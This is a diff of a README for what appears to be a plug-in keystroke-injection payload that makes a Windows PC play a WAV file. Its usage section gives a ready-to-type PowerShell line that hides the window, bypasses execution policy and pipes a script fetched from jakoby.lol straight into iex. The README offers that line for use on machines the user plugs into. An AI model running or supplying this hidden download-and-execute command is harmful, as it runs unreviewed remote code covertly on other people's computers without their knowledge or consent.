@@ -28,15 +28,16 @@ After one is the WAV file will be played.
 
 ### Dependencies
 
-* DropBox - Your Shared link for the intended file
 * Windows 10,11
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ### Executing program
 
+* Place the WAV Url in the $wav variable
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download your WAV file
+ 
 ```
 powershell -w h -NoP -NonI -Ep Bypass $wav='';iwr https://jakoby.lol/vus | iex
 ```
